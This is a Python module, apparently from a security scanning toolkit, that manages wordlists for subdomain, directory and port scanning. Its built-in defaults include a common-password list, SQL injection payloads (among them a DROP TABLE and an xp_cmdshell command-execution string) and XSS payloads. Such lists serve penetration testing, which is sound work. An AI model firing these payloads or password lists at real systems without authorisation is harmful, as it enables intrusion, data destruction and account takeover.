#!/usr/bin/env python3
"""
GYRO-Secure Wordlists Module
Centralized wordlist management with GitHub integration
"""

import requests
import json
import os
import sys
from urllib.parse import urljoin

class WordlistManager:
    """Manages wordlists from local and GitHub sources"""
    
    def __init__(self):
        self.github_raw_url = "https://raw.githubusercontent.com/GYRO-XD/gyro-secure/main/wordlists/"
        self.local_wordlist_dir = "wordlists/"
        self.cache_time = 3600  # 1 hour cache
        
        # Create wordlist directory if not exists
        if not os.path.exists(self.local_wordlist_dir):
            os.makedirs(self.local_wordlist_dir)
    
    def get_wordlist(self, wordlist_name, use_github=True):
        """Fetch wordlist from local or GitHub"""
        local_path = os.path.join(self.local_wordlist_dir, wordlist_name)
        
        # Try local first
        if os.path.exists(local_path):
            with open(local_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        
        # Fetch from GitHub if available
        if use_github:
            try:
                github_url = urljoin(self.github_raw_url, wordlist_name)
                response = requests.get(github_url, timeout=10)
                if response.status_code == 200:
                    # Cache locally
                    with open(local_path, 'w') as f:
                        f.write(response.text)
                    return [line.strip() for line in response.text.split('\n') if line.strip()]
            except:
                pass
        
        # Fallback to default wordlists
        return self.get_default_wordlist(wordlist_name)
    
    def get_default_wordlist(self, wordlist_name):
        """Return default wordlists if GitHub fetch fails"""
        default_wordlists = {
            'subdomains.txt': [
                'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 
                'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm', 
                'imap', 'test', 'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum', 
                'news', 'vpn', 'ns3', 'mail2', 'new', 'mysql', 'old', 'lists', 'support', 
                'mobile', 'mx', 'static', 'docs', 'beta', 'shop', 'sql', 'secure', 'demo', 
                'cp', 'calendar', 'wiki', 'web', 'media', 'email', 'images', 'img', 
                'download', 'dns', 'piwik', 'stats', 'dashboard', 'portal', 'manage', 
                'start', 'info', 'apps', 'video', 'sip', 'dns2', 'api', 'cdn', 'mssql', 
                'remote', 'server', 'ftp2', 'svn', 'host', 'git', 'site', 'store', 'help', 
                'app', 'cloud', 'backup', 'admin2', 'server2'
            ],
            
            'directories.txt': [
                'admin', 'backup', 'config', 'wp-admin', 'login', 'dashboard',
                'phpmyadmin', 'cpanel', 'webmail', 'logs', 'temp', 'tmp',
                'css', 'js', 'images', 'img', 'uploads', 'download', 'files',
                'includes', 'inc', 'lib', 'classes', 'functions', 'sql', 'db',
                'test', 'dev', 'stage', 'api', 'v1', 'v2', 'old', 'new',
                'wp-content', 'wp-includes', 'plugins', 'themes', 'uploads',
                'administrator', 'manager', 'control', 'panel', 'console'
            ],
            
            'passwords.txt': [
                'password', '123456', '123456789', 'qwerty', 'password123', 
                'admin', 'letmein', 'monkey', 'dragon', 'master', 'sunshine',
                'princess', 'iloveyou', 'computer', 'hello', 'fuckyou', 
                'shadow', 'baseball', 'superman', 'whatever', 'zaq1zaq1',
                'qazwsx', '123qwe', '1q2w3e', 'passw0rd', 'p@ssw0rd',
                'admin123', 'root', 'toor', '12345678', 'dragon123',
                'abc123', '111111', '123123', '654321', '0987654321',
                '!@#$%^&*', 'password1', 'Password1', 'admin@123',
                'welcome', 'welcome123', 'changeme', '1234', 'test'
            ],
            
            'sql_payloads.txt': [
                "'", "''", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
                "' AND 1=1--", "' AND 1=2--", "'; DROP TABLE users--",
                "' OR 'x'='x", "' UNION SELECT username,password FROM users--",
                "1' AND '1'='1", "1' AND '1'='2", "admin'--",
                "' OR '1'='1'/*", "' OR 1=1#", "1' OR '1'='1",
                "' UNION SELECT NULL,NULL,NULL--", "'; EXEC xp_cmdshell('dir')--"
            ],
            
            'xss_payloads.txt': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "'><script>alert('XSS')</script>",
                "<body onload=alert('XSS')>",
                "><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<details/open/ontoggle=alert('XSS')>",
                "'';!--\"<XSS>=&{()}",
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "onerror=alert('XSS')",
                "onload=alert('XSS')"
            ],
            
            'ports.txt': [
                '21', '22', '23', '25', '53', '80', '110', '135', '139', '143', 
                '443', '445', '993', '995', '1723', '3306', '3389', '5900', 
                '8080', '8443', '21', '25', '53', '80', '110', '443', '3306',
                '5432', '6379', '27017', '9200', '9300', '11211', '2181',
                '9092', '8081', '8888', '3000', '5000', '7000', '8000'
            ],
            
            'dns_records.txt': [
                'A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA', 'PTR',
                'SPF', 'DKIM', 'DMARC', 'CAA', 'SRV', 'NAPTR', 'LOC',
                'HINFO', 'RP', 'AFSDB', 'X25', 'ISDN', 'RT', 'NSAP',
                'NSAP-PTR', 'SIG', 'KEY', 'PX', 'GPOS', 'APL', 'DS',
                'SSHFP', 'IPSECKEY', 'RRSIG', 'NSEC', 'DNSKEY', 'DHCID',
                'NSEC3', 'NSEC3PARAM', 'TLSA', 'SMIMEA', 'HIP', 'NINFO',
                'RKEY', 'TALINK', 'CDS', 'CDNSKEY', 'OPENPGPKEY', 'CSYNC',
                'ZONEMD', 'SVCB', 'HTTPS'
            ]
        }
        
        return default_wordlists.get(wordlist_name, [])
    
    def update_wordlists(self):
        """Update all wordlists from GitHub"""
        wordlist_files = [
            'subdomains.txt', 'directories.txt', 'passwords.txt',
            'sql_payloads.txt', 'xss_payloads.txt', 'ports.txt',
            'dns_records.txt'
        ]
        
        updated = []
        for wl in wordlist_files:
            try:
                url = urljoin(self.github_raw_url, wl)
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    local_path = os.path.join(self.local_wordlist_dir, wl)
                    with open(local_path, 'w') as f:
                        f.write(response.text)
                    updated.append(wl)
                    print(f"[+] Updated: {wl}")
            except:
                print(f"[-] Failed to update: {wl}")
        
        return updated
    
    def list_wordlists(self):
        """List all available wordlists"""
        wordlist_files = [
            'subdomains.txt', 'directories.txt', 'passwords.txt',
            'sql_payloads.txt', 'xss_payloads.txt', 'ports.txt',
            'dns_records.txt'
        ]
        
        available = []
        for wl in wordlist_files:
            local_path = os.path.join(self.local_wordlist_dir, wl)
            if os.path.exists(local_path):
                with open(local_path, 'r') as f:
                    count = sum(1 for _ in f)
                available.append(f"{wl} ({count} entries)")
            else:
                available.append(f"{wl} (not downloaded)")
        
        return available

# Initialize global wordlist manager
wordlist_manager = WordlistManager()